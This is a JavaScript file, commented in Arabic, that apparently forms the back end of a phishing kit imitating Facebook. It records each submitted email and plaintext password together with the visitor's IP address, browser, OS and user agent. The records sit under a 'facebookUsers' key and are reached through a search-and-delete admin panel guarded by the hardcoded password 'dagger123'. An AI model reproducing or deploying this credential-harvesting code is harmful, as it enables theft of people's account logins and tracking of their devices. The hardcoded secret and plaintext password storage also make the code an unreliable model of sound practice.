// كلمة مرور المدير
const ADMIN_PASSWORD = 'dagger123';

// بيانات المستخدمين
let users = JSON.parse(localStorage.getItem('facebookUsers')) || [];

// حفظ البيانات في localStorage وملف users.js (محاكاة)
function saveUsersData() {
    localStorage.setItem('facebookUsers', JSON.stringify(users));
    
    // في تطبيق حقيقي، هنا سيتم إرسال البيانات إلى الخادم
    console.log('يتم تحديث ملف users.js على الخادم هنا');
}

// جمع معلومات الجهاز
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let browser = "غير معروف";
    let os = "غير معروف";
    
    // كشف المتصفح
    if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Edge")) browser = "Edge";
    else if (userAgent.includes("Opera")) browser = "Opera";
    else if (userAgent.includes("MSIE")) browser = "IE";
    
    // كشف نظام التشغيل
    if (userAgent.includes("Windows")) os = "Windows";
    else if (userAgent.includes("Mac")) os = "MacOS";
    else if (userAgent.includes("Linux")) os = "Linux";
    else if (userAgent.includes("Android")) os = "Android";
    else if (userAgent.includes("iOS")) os = "iOS";
    
    return { browser, os, userAgent };
}

// الحصول على عنوان IP
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip || "غير معروف";
    } catch (error) {
        console.error("خطأ في جلب IP:", error);
        return "غير معروف";
    }
}

// إضافة مستخدم جديد
async function addUser(email, password) {
    const ip = await getIPAddress();
    const deviceInfo = getDeviceInfo();
    
    const newUser = {
        id: Date.now(),
        email,
        password,
        ip,
        browser: deviceInfo.browser,
        os: deviceInfo.os,
        userAgent: deviceInfo.userAgent,
        timestamp: new Date().toLocaleString()
    };
    
    users.push(newUser);
    saveUsersData();
    return newUser;
}

// حذف مستخدم
function deleteUser(userId) {
    users = users.filter(user => user.id !== userId);
    saveUsersData();
}

// البحث عن مستخدمين
function searchUsers(query) {
    return users.filter(user => 
        user.email.includes(query) || 
        user.ip.includes(query) ||
        user.browser.includes(query) ||
        user.os.includes(query)
    );
}

// تصدير الدوال والبيانات المطلوبة
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { users, addUser, deleteUser, searchUsers, ADMIN_PASSWORD };
}